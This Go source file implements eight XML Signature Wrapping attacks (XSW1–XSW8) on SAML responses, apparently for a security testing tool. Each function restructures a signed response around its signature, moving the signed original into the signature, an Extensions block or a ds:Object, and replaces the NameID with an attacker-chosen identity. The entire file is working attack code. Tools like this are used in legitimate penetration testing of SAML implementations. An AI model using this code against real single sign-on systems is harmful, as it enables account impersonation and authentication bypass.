package saml

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"

	"github.com/beevik/etree"
)

const (
	samlpNS = "urn:oasis:names:tc:SAML:2.0:protocol"
	samlNS  = "urn:oasis:names:tc:SAML:2.0:assertion"
	dsNS    = "http://www.w3.org/2000/09/xmldsig#"
)

func findElement(parent *etree.Element, space, tag string) *etree.Element {
	for _, child := range parent.ChildElements() {
		if child.Tag == tag && child.Space == space {
			return child
		}
	}
	return nil
}

func findElementRecursive(parent *etree.Element, space, tag string) *etree.Element {
	if parent.Tag == tag && parent.Space == space {
		return parent
	}
	for _, child := range parent.ChildElements() {
		if result := findElementRecursive(child, space, tag); result != nil {
			return result
		}
	}
	return nil
}

func findSignature(el *etree.Element) *etree.Element {
	return findElement(el, "ds", "Signature")
}

func removeSignature(el *etree.Element) {
	sig := findSignature(el)
	if sig != nil {
		el.RemoveChild(sig)
	}
}

func tamperNameID(el *etree.Element, evilNameID string) string {
	nameID := findElementRecursive(el, "saml", "NameID")
	if nameID == nil {
		return ""
	}
	old := nameID.Text()
	nameID.SetText(evilNameID)
	return old
}

func generateEvilID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return "_evil_" + hex.EncodeToString(b)
}

func applyXSW1(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw1: no root element")
	}

	responseSig := findSignature(response)
	if responseSig == nil {
		return fmt.Errorf("xsw1: no response signature found")
	}

	originalResponse := response.Copy()
	removeSignature(originalResponse)

	response.CreateAttr("ID", generateEvilID())
	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw1: no assertion found")
	}
	tamperNameID(assertion, evilNameID)

	responseSig.AddChild(originalResponse)

	return nil
}

func applyXSW2(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw2: no root element")
	}

	responseSig := findSignature(response)
	if responseSig == nil {
		return fmt.Errorf("xsw2: no response signature found")
	}

	originalResponse := response.Copy()
	removeSignature(originalResponse)

	response.CreateAttr("ID", generateEvilID())
	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw2: no assertion found")
	}
	tamperNameID(assertion, evilNameID)

	sigIndex := -1
	for i, child := range response.ChildElements() {
		if child == responseSig {
			sigIndex = i
			break
		}
	}

	if sigIndex >= 0 {
		response.InsertChildAt(sigIndex, originalResponse)
	} else {
		response.AddChild(originalResponse)
	}

	return nil
}

func applyXSW3(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw3: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw3: no assertion found")
	}

	evilAssertion := assertion.Copy()
	removeSignature(evilAssertion)
	evilAssertion.CreateAttr("ID", generateEvilID())
	tamperNameID(evilAssertion, evilNameID)

	assertionIndex := -1
	for i, child := range response.ChildElements() {
		if child == assertion {
			assertionIndex = i
			break
		}
	}

	if assertionIndex >= 0 {
		response.InsertChildAt(assertionIndex, evilAssertion)
	} else {
		response.AddChild(evilAssertion)
	}

	return nil
}

func applyXSW4(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw4: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw4: no assertion found")
	}

	evilAssertion := assertion.Copy()
	removeSignature(evilAssertion)
	evilAssertion.CreateAttr("ID", generateEvilID())
	tamperNameID(evilAssertion, evilNameID)

	response.RemoveChild(assertion)
	evilAssertion.AddChild(assertion)
	response.AddChild(evilAssertion)

	return nil
}

func applyXSW5(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw5: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw5: no assertion found")
	}

	originalCopy := assertion.Copy()
	removeSignature(originalCopy)

	assertion.CreateAttr("ID", generateEvilID())
	tamperNameID(assertion, evilNameID)

	response.AddChild(originalCopy)

	return nil
}

func applyXSW6(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw6: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw6: no assertion found")
	}

	assertionSig := findSignature(assertion)
	if assertionSig == nil {
		return fmt.Errorf("xsw6: no assertion signature found")
	}

	originalCopy := assertion.Copy()
	removeSignature(originalCopy)

	assertion.CreateAttr("ID", generateEvilID())
	tamperNameID(assertion, evilNameID)

	assertionSig.AddChild(originalCopy)

	return nil
}

func applyXSW7(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw7: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw7: no assertion found")
	}

	evilAssertion := assertion.Copy()
	removeSignature(evilAssertion)
	evilAssertion.CreateAttr("ID", generateEvilID())
	tamperNameID(evilAssertion, evilNameID)

	extensions := etree.NewElement("samlp:Extensions")
	extensions.CreateAttr("xmlns:samlp", samlpNS)
	extensions.AddChild(evilAssertion)

	assertionIndex := -1
	for i, child := range response.ChildElements() {
		if child == assertion {
			assertionIndex = i
			break
		}
	}

	if assertionIndex >= 0 {
		response.InsertChildAt(assertionIndex, extensions)
	} else {
		response.AddChild(extensions)
	}

	return nil
}

func applyXSW8(doc *etree.Document, evilNameID string) error {
	response := doc.Root()
	if response == nil {
		return fmt.Errorf("xsw8: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")
	if assertion == nil {
		return fmt.Errorf("xsw8: no assertion found")
	}

	assertionSig := findSignature(assertion)
	if assertionSig == nil {
		return fmt.Errorf("xsw8: no assertion signature found")
	}

	originalCopy := assertion.Copy()
	removeSignature(originalCopy)

	assertion.CreateAttr("ID", generateEvilID())
	tamperNameID(assertion, evilNameID)

	dsObject := etree.NewElement("ds:Object")
	dsObject.CreateAttr("xmlns:ds", dsNS)
	dsObject.AddChild(originalCopy)
	assertionSig.AddChild(dsObject)

	return nil
}

func ApplyXSW(xmlBytes []byte, variant string, evilNameID string) ([]byte, error) {
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, fmt.Errorf("xsw: failed to parse XML: %w", err)
	}

	var err error
	switch variant {
	case "xsw1":
		err = applyXSW1(doc, evilNameID)
	case "xsw2":
		err = applyXSW2(doc, evilNameID)
	case "xsw3":
		err = applyXSW3(doc, evilNameID)
	case "xsw4":
		err = applyXSW4(doc, evilNameID)
	case "xsw5":
		err = applyXSW5(doc, evilNameID)
	case "xsw6":
		err = applyXSW6(doc, evilNameID)
	case "xsw7":
		err = applyXSW7(doc, evilNameID)
	case "xsw8":
		err = applyXSW8(doc, evilNameID)
	default:
		return nil, fmt.Errorf("xsw: unknown variant %q", variant)
	}
	if err != nil {
		return nil, err
	}

	doc.WriteSettings = etree.WriteSettings{
		CanonicalEndTags: false,
		CanonicalText:    false,
		CanonicalAttrVal: false,
	}

	return doc.WriteToBytes()
}
